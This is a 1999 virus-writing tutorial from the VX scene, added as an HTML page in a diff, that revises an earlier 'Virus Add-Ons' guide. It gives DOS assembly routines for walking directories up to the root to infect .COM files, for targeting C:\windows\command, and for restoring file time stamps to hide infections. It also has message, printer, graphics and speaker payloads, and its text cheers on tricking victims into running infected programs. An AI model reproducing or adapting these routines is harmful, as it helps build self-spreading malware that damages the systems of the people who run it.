@@ -1,0 +1,477 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - The Virus Add-Ons (Days) Revisited</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<P align="center"><b><font color="#004080" size="+3">The Virus Add-Ons (Days) 
+  Revisited</font><font color="#004080"><br>
+  <font size="+1">Revised and recompiled by GeneCode (1999)</font></font></b>
+<P align="center"><font size="-1"><a href="tumisc53.htm">Original &quot;Virus 
+  Add-Ons&quot; Tutorial by Opic</a></font>
+<hr>
+<P> <b>INTRODUCTION</b></P>
+<P>
+First of all let me introduce myself to you all nice people in VX Community.
+I am GeneCode and I am a new in VX world... I only got involved in writing virus
+on last Nov 1998. However, I am no lamer or computer idiot. I have experience
+in Delphi(Pascal), C++, and ASM (plus javascript and html to be precise).
+However, I only did ASM programming on the old Motorola MC6811 motherboard.
+So most of the instructions are different from 80x86 machines. I must say
+I have found writing virus very exciting and challenging, and I like it a lot
+despite how most people say that a virus is malicious and a menace. I only
+have a crappy Notebook with Pentium 150Mhz MMX and WINDOWS95... yeah I know..
+windows sux... but I allready have Linux as a second O/S so its a good start.
+</P><P>
+Ok secondly, this tutorial is actually a revised version of Opic's
+[Codebreakers] Virus "Add-Ons" Tutorial which is a part of The CodeBreakers'
+Zine #3..(and I am sure you allready read it in VDAT 1.6 :). As earlier
+stated by Opic, this tutorial is mainly directed to newbie (like myself)
+however I thought I'd do a remake of the whole docs in case any of you guys
+are as *thick* as I was. If you actually implement the codes from Opic's examples
+I can assure you mostly will face a lot of problems. As allready stated by Opic,
+you were not expected to cut+paste from his texts. But I did and it didn't work
+perfectly as I wanted it to be. So I will describe the changes that you have
+to make if you want to implement the codes and what to do if it doesn't work.
+</P><P>
+There are some stuffs from Opic's text that I have excluded, so I do suggest 
+that you take a hold of his text too, and use this text as complementary. 
+I also add in some cool stuff that you could do for your payload routines..
+so read-on.. 
+</P><P>
+Oh yeah, just a note:  If you are  reading this text, it doesnt mean that 
+you are dumb, but hey, we all ought to start from somewhere right? All thanks 
+goes to Opic, MetGod, ULTRAS and Badg3rX and ultimately to our wonderful 
+VDAT author: Cicatrix!
+</P>
+<P> <b>GENE.ONE-THE DOTDOT METHOD</b></P>
+<P>
+Heh heh. In this part of gene, I'll be revising the DotDot method for
+changing the directory when we are done with infecting all of the files in
+the directory where our virus was run. I intend to make this tutorial
+almost independent, therefore I will re-write the methods as shown
+by Opic once again with a little bit modification...
+</P>
+<blockquote>
+  <PRE>
+find_first:
+        mov ah,4eh            ;finds first file in the starting directory
+        mov dx,offset filespec  ;loads type of file we are looking for in dx 
+        int 21h               ;go dos!
+        jnc open              ;found one! go to open and infect routine
+                              ;it should be noted that the findnext command
+                              ;should be somewhere in end of this routine
+        jmp DotDot            ;otherwise change directory
+
+DotDot:                       ;this is the dot dot routine
+        mov ah, 3Bh           ;int for "chdir" set current directory
+        lea dx,[bp+dotdot]    ;load dotdot from datasegment
+        int 21h               ;do it! 
+        jnc find_first        ;find first file in new directory
+        jmp exit_stage_left   ;we hit root and have now have max file
+                              ;infection (well max for this method)
+dotdot            db  '..',0
+filespec          db  '*.com',0
+</PRE>
+</blockquote>
+<P>
+This routine will direct your infection from the current directory up to the root. 
+For example, 
+      If your virus.com was run in c:\windows\command\, then it will infect all
+      com files in the current directory, and then move up to c:\windows and infect
+      all the coms in there, and then go to c:\ and infect all the coms in that dir.
+      And then, it exits. If you are looking for a method of traversing the whole
+      directory structure in one's hard drive, I'd suggest you look for Spanska's
+      text. But, there are no need for that if you want your virus only to infect
+      a few on first run.
+</P>
+<P> <b>HOWEVER.... </b></P>
+<P>
+I implemented this method in my com virus and for some reason, it failed
+to change the directory although it does compile. SO I started to wonder..
+what went wrong during runtime? I thought, wait a minute... this means that
+the chg_dir routine is not working... so I run my Hex viewer and take a look
+at the Hex dump... and then suddenly I was smiling.. yes.. its the dotdot data that
+was not loaded into DX... so I tried changing the instruction 
+</P>
+<blockquote>
+  <PRE>
+lea dx,[bp+dotdot]
+
+;into something more simpler... 
+
+mov dx,offset dotdot 
+
+;Voila! It works!
+</PRE>
+</blockquote>
+<P>
+NOTE: 3Bh is the settings for 'cd'. Therefore, if you are creative enough, you'd
+probably come up with something like this:
+</P>
+<blockquote>
+  <PRE>
+;------- As in Opic's Text----------------
+windoze:
+      mov ah,3bh                  ;int to "chdir" set current directory
+      mov dx,offset winspec       ;load windows location
+      int 21h                     ;go dos go!
+      jnc find_first              ;find first file to infect
+      jmp exit_stage_left         ;done with doze? lets bring it on home! 
+
+winspec   db 'C:\windows\command',0  
+;---------End of Opic's text------------
+</PRE>
+</blockquote>
+<P> In this case, disregarding from which directory your virus was run, this will 
+  infect straight to the c:\windows\command directory where all those lovely *.com's 
+  reside! BUT, remember that not all computers have the same directory structure 
+  - for eg, what if the victim's computer has a different windows boot directory, 
+  like c:\Windows98 or c:\windows001 or even different drive letter, like d:\windows\ 
+  or z:\windows? Trouble! So, in this case, I think it is wise to let a 'dropper' 
+  do the job for your virus. I won't go on talk about 'dropper' in here but you 
+  can d/l the text from my site &lt;<a href="http://members.xoom.com/genecode">http://members.xoom.com/genecode</a>&gt;. 
+</P>
+<P> <b>GENE.TWO-RESTORING TIME/DATE STAMPS</b></P>
+<P>
+Ok, so you managed to fool someone in running game.com of yours ;),
+but your lame victim is smart enough to check the date stamps.. and finally
+finds out that your game.com IS a virus that YOU gave him! No shit! This
+means your plot in spreading the virus has ultimately comes down to a failure!
+Just to make a little stealth ability, how about restoring the date
+stamps of the infected files? That would be a good idea right? No
+problemo, DOS got all the answer.
+</P>
+<blockquote>
+  <PRE>
+;------------ As written by Opic ---------------
+Get Time/Date stamps:
+This should be done after you open the file but BEFORE you infect or modify
+the file in any way.
+                 
+mov ax,5700h                   ;get files time/date stamp
+int 21h                        ;now!
+push dx                        ;save the values
+push cx                        ;in dx and cx
+
+Restore Time/Date stamps:
+This should be done right before you close the file.
+
+mov ax,5701h                      ;restore files time/date stamp
+      pop dx                      ;from
+      pop cx                      ;dx and cx
+      int 21h                     ;now!
+;-------------End of Opic's text------------------
+</PRE>
+</blockquote>
+<P>
+Ok, I also implemented this in my code but for some reason, it didn't
+return the date/time stamp at all. Instead I get a blank at the
+Modified column in my windows explorer (ok, i use Windows95 so sue me). 
+So, I looked up in my MC6811 assembly instructions listing and remembered 
+that when you push data into stacks, you have to pull it in a 
+FILO(first-in last-out) order. If you look up there, we first push 
+the value in DX first, and then into CX. Therefore to recover them, 
+we should be pulling them from CX first, and THEN DX. 
+So, the routine should be:
+</P>
+<blockquote>
+  <PRE>
+getdate:        ;right after open routine get the date
+        mov   AX,5700h                  ;get files time/date stamp
+        int   21h                       ;now!
+        push  DX                        ;save the values
+        push  CX                        ;in dx and cx
+        ;the appending routine should be somewhere in the middle
+
+resdate        ; restore the date
+        mov   AX,5701h                  ;restore files time/date stamp
+        pop   CX                        ;from CX FIRST
+        pop   DX                        ;and THEN from DX
+        int   21h                       ;now!
+        ;right before close routine
+</PRE>
+</blockquote>
+<P>
+So now, this should work. If not, then ermm.. hey! it worked for me ok!
+However, if in between the two routines you used the register CX and DX
+(for eg. mov  CX,offset end1-offset start ;), you will not be able to
+restore the date as the values were messed up. Solution? Easy-peasy...
+just load the values in a different data register that is not used! Duh..
+</P><P>
+Just a note here: This technique is not enough for stealth cause without
+a good encryption, your virus will always be a naked one and is therefore
+open to be scanned and stopped by an antivirus scanner. I won't cover
+encryption techniques in here since I am not an expert on that topic...
+but hopefully I will be in the near future.. heh heh..
+</P>
+<P> <b>GENE.THREE-PAYLOADS (ie. THE FUN PART) </b></P>
+<P>
+Now we are on the main topic of this whole text.....
+</P><P>
+OK, When you create a living being, you want it to be perfect. And
+you want it to dazzle your victim when your creations make its appearance.
+I mean, there is no point in creating a virus if no one is to notice it.
+So your part now is to be as creative as possible. Opic has put in some
+cool stuffs, and I am here to add it some more.
+</P><P>
+Opic made a statement on destructive payloads: He doesn't like the idea
+of destroying someone's hard drive. As for me, I must say that I don't
+agree with that too. I mean, grow up!! The purpose of writing a virus is
+not to destroy ppl's personal data or reformat the disk... I mean if we 
+do that, then obviously our virus won't spread... the keyword here is
+ensuring what you want to convey within your virus reaches every computer
+in the universe.. :)
+</P>
+<P> <b>MESSAGE PAYLOAD: </b></P>
+<P>
+The purpose of a payload is to make the victim really experience your virus.
+And to make your virus being remembered by the victim forever in his stinkin life.
+So the best thing to do is to make your payload very very good. When I say
+'very very good' I hope you get the point that the payload shouldn't just be
+a simple message as in:
+</P>
+<blockquote>
+  <PRE>
+        mov ah,9h
+        lea dx,offset message
+        int 21h
+message db  'Virus Lame by LamePayload',0
+</PRE>
+</blockquote>
+<P>
+But instead, your payload should be outstanding... different and unique!
+You could put a poem or some cool text as the message, or you could also
+put some ASCII art in it (eg. the word GeneCode at the top of this file)
+</P>
+<P> NOTE: To create cool ASCII art, you use characters that is not available in 
+  your keyboards - which can be accessed by pressing ALT+### where # is a number.. 
+  eg. Alt+219 gives ' ' (you have to view this file using DOS's editor. Dont use 
+  notepad/windows txt viewer) (<font size="-1">Non HTML character / CCTX]</font><br>
+  Not good enough eh? Ok, lets spice it up a little bit more. </P>
+<P> <b>PRINTER PAYLOAD</b></P>
+<P>
+How about printing something out of the printer? This routine is as written
+by Opic:
+</P>
+<blockquote> 
+  <blockquote>
+    <PRE>
+;-------------- As written by Opic ---------------
+ mov ah,01h         ;begin of printer payload
+ mov dx,0h          ;put 0h in dx
+ int 17h            ;int for initializing printer
+ lea si,string1     ;load string1 to si
+ mov cx,String1Len  ;move string1len to cx
+PrintStr:           ;label fer printing our message
+ mov ah,00h         ;write characters
+ lodsb              ;you know right :)
+ int 17h            ;printer int
+ loop PrintStr      ;loop printstr till we are done
+
+String1     db  'Vive la difference!',0dh,0ah
+            db  'Suriv, coded and copywrited:Opic,[codebreakers,98]',0ch
+EndStr1:
+String1Len  EQU EndStr1-String1
+;-------------End of Opic's text------------------
+</PRE>
+  </blockquote>
+</blockquote>
+<P>
+You must however consider what happens if the computer is not connected
+to a printer. If you don't include any error handling, your virus will
+hang and do nothing for the payload.. or probably even doesn't work at all!
+So this is a good idea for a payload, but not really practical unless 
+you write an error exception routines.
+</P>
+<P> <b>GRAPHICS PAYLOAD </b></P>
+<P>
+As stated by Opic, programming graphics in ASM is very difficult.
+And I know very little about it. But let me tell you what I DO know.
+First of all, lets take a look the routine that Opic explained 
+(which places a blue pixel):
+</P>
+<blockquote>
+  <PRE>
+;-----As written as Opic-----------------------------------
+Heres a bit of code that will create a blue pixel in the center of your screen.
+ mov ax,13          ;sets mode 13h
+ int 10h            ;int 10=video int
+ mov ah,0ch         ;fuct 0Ch (look it up, you have the R.browns right?)
+ mov al,17          ;color 17=blue
+ mov cx,160         ;x axis position 160 (center)
+ mov dx,100         ;y axis position 100 (center)
+ int 10h            ;thats it 
+;-----End of Opic's text-----------------------------------
+</PRE>
+</blockquote>
+<P>
+Important Note: Ralph Brown's Interrupt List is essential for every VX writer.
+</P><P>
+I have taken a step further from Opic's idea to display a message 
+in video mode... it is really simple.. Ok, here is the code:
+</P>
+<blockquote>
+  <PRE>
+       mov   AX,13h                 ; sets the video mode
+       int   10h                    ; do video int
+       lea   SI,msg                 ; load string to print to screen
+       mov   CX,emsg-msg            ; length
+print: lodsb                        ; load next byte into al
+       mov   AH,0eh                 ; print teletype mode
+       mov   BX,10                  ; 10 = green
+       int   10h
+       loop  print
+
+msg    db 'GeneCode In Video Mode',13,10
+       db 'Wish You Were Here...',0
+emsg   db '',0
+</PRE>
+</blockquote>
+<P>
+I hope you can figure it out yourself with the help of the comments.
+If you want to display another sets of strings with different color,
+then just repeat the same procedure with different value loaded into
+BX. Here's the list of colors (not all included):
+2:darkgreen,3:darkcyan,4:darkred,5:darkmagenta,6:brown,7:grey
+8:darkgrey,9:blue,10:green,11:cyan,12:red,13:magenta
+Well, thats enough to get you started. There are 256 colors in this
+mode.. so if you wanna know, test them all.. hehe..
+</P><P>
+And here is one more routine if you want to fill the whole screen with
+a particular color(in this case, red)
+</P>
+<blockquote>
+  <PRE>
+        mov AX,13h              ;set video mode
+        int 10h                 ;go and set it now!
+        mov AX,0A000h 		;load memory segment of mode 13h
+        mov ES,AX       	; Set ES to A000h (cannot load directly)
+        mov DI,0        	; We want to fill ES:DI with a color to fill the screen
+        mov CX,320*200/2   	; CX=32000 words/screen
+        mov AX,2828h  		; Color 40 (28 hex) is a bright red.
+        rep stosw     		; Store 32000 2828h's at 0A000h:0 to fill the screen
+</PRE>
+</blockquote>
+<P><b> SOUND PAYLOAD</b></P>
+<P>
+Okay, now... I guess this is enough with doing a visual payload. Now,
+we are on to audio payload. I did this as my project in my first year
+in my university. But I used MC6811 instead of 086 machines. So there
+was quite a modification made. Here's a listing from ULTRAS with a little
+bit of modification.
+</P>
+<blockquote>
+  <PRE>
+;you can cut and paste and compile using TASM and TLINK /t
+sound  segment
+       assume cs:sound,ds:sound
+       org 100h
+
+genecode proc near
+
+start:
+
+initialise:        
+          PUSH  CS                         
+          POP   DS                        
+          IN    AL,061h                      
+          OR    AL,03                        
+          OUT   061h,AL                    
+          MOV   SI,0                       
+          MOV   AL,0B6h                    
+          OUT   043h,AL
+
+next_note:  
+          MOV   BX,offset melody
+          MOV   AL,[BX][SI]                
+          CMP   AL,0FFh                     
+          JE    no_more
+          CBW                             
+          MOV   BX,offset freq
+          DEC   AX                          
+          SHL   AX,1
+          MOV   DI,AX                       
+          MOV   DX,[BX][DI]                 
+          MOV   AL,DL                       
+          OUT   042H,AL                     
+          MOV   AL,DH                       
+          OUT   042H,AL                     
+          MOV   AH,0                        
+          INT   1Ah
+
+          MOV   BX,offset len
+          MOV   CL,[BX][SI]                
+          MOV   CH,0                       
+          MOV   BX,DX
+          ADD   BX,CX
+
+still_snd:  
+          INT   1Ah                         
+          CMP   DX,BX                       
+          JNE   still_snd
+          INC   SI                          
+          JMP   next_note
+
+no_more:
+          IN    AL,061h                      
+          AND   AL,0FCh                     
+          OUT   061h,AL                   
+          RET                            
+
+;The tunetable   A    Bb   B     C    C#   D    D#   E    F   F#   G    G#   A'  break
+;                1    2    3     4    5    6    7    8    9   10   11   12   13   14
+freq         dw 2273,2146,2024,1912,1805,1704,1608,1517,1433,1353,1276,1205,1136,0
+
+melody    db 8,14,8,14,9,14,11,14,11,14,9,14,8,14,6,14,4,14,4,14,6,14,8,14,8,14,6,14,6,0FFh
+;1=A, 2=Bflat, 3=B, 4=C etc.
+
+len       db 5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,7,1,2,1,7,0FFh
+;the length of each note being played
+
+ genecode endp
+ sound    ends
+          end start
+</PRE>
+</blockquote>
+<P>
+Ermm.. I can't be bothered to explain them all... but here's the main routine:
+</P>
+<ol>
+  <li> Initialise PC speaker. </li>
+  <li> Read the melody.. ie. as defined in freq. </li>
+</ol>
+<ul>
+  <li> In the code above, there are 13 notes: A up to A'. </li>
+  <li> The freq are calculated by some aweful maths so I wont bore you. </li>
+  <li> The melody should be between 1 to 13. and must be accompanied with the 
+    length of each melody. 14 is a short break between each note. </li>
+  <li> It must be included in between notes otherwise your melody will sound weird. 
+  </li>
+</ul>
+<P>
+3. Read melody until 0FFh is found... where it marks the end of melody.
+</P><P>
+So what you need to do now is being creative. The song I put up there is the
+Beethoven's 9th Symphony. Create your own beats and make it cool..
+</P><P>
+This text is not perfect. So do expect some spelling errors or even error in the
+code...  I am hoping that anyone who detected the error to correct it and make
+it known to me and the VX community so that we don't make the same mistake twice.
+</P>
+<P> There you go. Damn, this is long. Ok, I hope you are creative enough to make 
+  your own virus that plays the For Whom The Bell Tolls song accompanied with 
+  a cool and colorful ASCII art message grafitti and surely will make your victim 
+  astonished!. Oh well, if you have any troubles or problems, you can always email 
+  me at <a href="mailto:gene_code@yahoo.com">gene_code@yahoo.com</a> and NOT genecode@yahoo.com 
+  &lt;-- some asshole allready got that for his own lame ass. But please bare 
+  in mind, that I am a newbie just like you are in Virus writing. So, don't come 
+  to me and ask: How can I make encryption in my virus?.. I know how to do it, 
+  but I am no expert... YET. Have fun with your payloads, and make sure that YOUR 
+  PAYLOAD REALLY PAYS! As Opic stated: ENJOY CREATING YOUR VIRUS... </P>
+<P> GeneCode email:<a href="mailto:gene_code@yahoo.com">gene_code@yahoo.com</a> 
+  <br>
+  URL:<a href="http://members.xoom.com/genecode">http://members.xoom.com/genecode</a> 
+</P>
+<hr>
+</BODY>
+</HTML>
